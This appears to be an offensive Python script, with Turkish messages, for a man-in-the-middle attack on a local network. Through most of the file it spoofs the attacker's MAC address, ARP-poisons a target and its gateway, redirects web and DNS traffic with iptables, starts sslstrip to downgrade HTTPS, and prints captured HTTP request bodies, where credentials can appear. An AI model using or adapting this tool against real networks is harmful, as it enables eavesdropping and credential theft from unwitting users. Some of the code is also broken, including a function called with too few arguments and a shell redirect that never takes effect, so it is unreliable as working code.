#ip-forwording-> echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
import optparse
import subprocess
import time
import random
from scapy_http import http

def arp_poisoning(target_ip,fake_ip,interface):
    #op=2 just send response packet
    target_mac = get_target_mac(target_ip)
    response_pkt =  scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=fake_ip)
    scapy.send(response_pkt, verbose=False)


def get_target_mac(target_ip):
    arp_request_packet = scapy.ARP(pdst=target_ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list,unanswered_list = scapy.srp(combined_packet,timeout=2, verbose=False)
    for result in answered_list:
        pair = result[1]
        mac = pair.sprintf("%Ether.src%")
        return mac

def escape_poisoning(fooled_ip,accesspoint_ip):
    fooled_mac = get_target_mac(fooled_ip)
    accesspoint_mac =get_target_mac(accesspoint_ip)
    response_pkt =scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=accesspoint_ip, hwsrc=accesspoint_mac)
    scapy.send(response_pkt, verbose= False, count=6)

def packets_listener(interface): #prn=callback function
    def analyze_packets(packet):
        #packet.show()
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):
                print(packet[scapy.Raw].load)
    scapy.sniff(iface=interface, store=False, prn=analyze_packets)


def change_my_mac_adress(interface):
    mac = "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
    )
    print(subprocess.call(f"ifconfig {interface} | grep 'ether'", shell=True))
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", mac])
    subprocess.call(["ifconfig", interface, "up"])
    print("_" * 80)
    print(subprocess.call(f"ifconfig {interface} | grep 'ether'", shell=True))
    print("Macchanger terminated..")

parser = optparse.OptionParser()
parser.add_option("-t", "--targetip", dest="target_ip", help="Enter target ip!")
parser.add_option("-g", "--gateway", dest="fake_ip", help="Enter gateway ip!")
parser.add_option("-i", "--interface",dest="interface",help="Enter interface for random mac adress!")
options, arguments = parser.parse_args()
target_ip = options.target_ip
fake_ip = options.fake_ip
interface = options.interface

change_my_mac_adress(interface)


subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "udp", "--destination-port", "53", "-j", "REDIRECT", "--to-port", "53"])
subprocess.call(["sslstrip", "&"])


number = 0

try:

    while True:
        number += 2
        print("\rSending Packet.. " + str(number),end="")
        arp_poisoning(target_ip,fake_ip)
        arp_poisoning(fake_ip,target_ip)
        packets_listener(interface)

        time.sleep(3)

except KeyboardInterrupt:
    escape_poisoning(target_ip,fake_ip)
    escape_poisoning(fake_ip,target_ip)
    change_my_mac_adress(interface)
    print("Program sonlandırıldı..")
